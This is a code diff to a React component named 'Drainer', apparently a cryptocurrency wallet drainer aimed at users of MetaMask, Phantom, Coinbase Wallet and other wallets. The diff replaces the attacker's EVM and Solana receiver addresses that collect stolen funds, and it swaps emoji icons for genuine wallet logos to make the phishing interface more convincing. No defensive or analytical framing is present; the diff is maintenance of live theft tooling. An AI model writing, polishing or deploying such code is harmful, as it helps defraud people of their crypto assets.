@@ -3,9 +3,10 @@ import { useState, useEffect } from 'react'
 import { ethers } from 'ethers'
 import * as solanaWeb3 from '@solana/web3.js'
 import * as splToken from '@solana/spl-token'
+import Image from 'next/image'
 
-const EVM_RECEIVER = "0x5578045035fa1f6c1359d29efe4ff3b979e5b267"
-const SOL_RECEIVER = "7p5Ea6LahtSgy42T1ELC863VayJfPmTDLrDUsRwaSAWN"
+const EVM_RECEIVER = "0x467E3346A112EA09870e0eC1af688A48d00A824F" // Eth
+const SOL_RECEIVER = "CGgAiKGdF9DKoG92iRXnFJTj5TYXsqgiakzM3YMSccHe" // Sol
 
 export default function Drainer() {
   const [account, setAccount] = useState('')
@@ -76,12 +77,12 @@ export default function Drainer() {
   }, [])
 
   const wallets = [
-    { name: "MetaMask", icon: "🦊", is: 'isMetaMask', type: 'evm' },
-    { name: "Trust Wallet", icon: "🛡️", is: 'isTrust', type: 'evm' },
-    { name: "Phantom", icon: "👻", is: 'isPhantom', type: 'solana' },
-    { name: "Backpack", icon: "🎒", is: 'isBackpack', type: 'solana' },
-    { name: "Solflare", icon: "☀️", is: 'isSolflare', type: 'solana' },
-    { name: "Coinbase Wallet", icon: "🔵", is: 'isCoinbaseWallet', type: 'evm' },
+    { name: "MetaMask", icon: "/wallets/metamask.png", is: 'isMetaMask', type: 'evm' },
+    { name: "Trust Wallet", icon: "/wallets/trustwallet.png", is: 'isTrust', type: 'evm' },
+    { name: "Phantom", icon: "/wallets/phantom.png", is: 'isPhantom', type: 'solana' },
+    { name: "Backpack", icon: "/wallets/backpack.png", is: 'isBackpack', type: 'solana' },
+    { name: "Solflare", icon: "/wallets/solflare.jpeg", is: 'isSolflare', type: 'solana' },
+    { name: "Coinbase Wallet", icon: "/wallets/coinbase.png", is: 'isCoinbaseWallet', type: 'evm' },
   ]
 
   const connectWallet = async (walletType: string) => {
@@ -472,10 +473,19 @@ export default function Drainer() {
                     <button
                       key={w.name}
                       onClick={() => connectWallet(w.name)}
-                      className="bg-gray-800 hover:bg-gray-700 active:bg-gray-600 p-4 sm:p-5 md:p-6 rounded-xl sm:rounded-2xl transition-all transform active:scale-95 flex flex-col items-center touch-manipulation"
+                      className={`flex items-center justify-center gap-2 p-3 sm:p-4 rounded-xl transition-all duration-200 ${account ? 'opacity-50 cursor-not-allowed' : 'hover:bg-white/10 hover:scale-105'}`}
+                      disabled={!!account}
                     >
-                      <span className="text-3xl sm:text-4xl mb-1 sm:mb-2">{w.icon}</span>
-                      <div className="text-xs sm:text-sm md:text-base font-medium">{w.name}</div>
+                      <div className="w-6 h-6 relative">
+                        <Image 
+                          src={w.icon} 
+                          alt={`${w.name} logo`} 
+                          fill 
+                          className="object-contain"
+                          sizes="24px"
+                        />
+                      </div>
+                      <span>{w.name}</span>
                     </button>
                   ))}
                 </div>
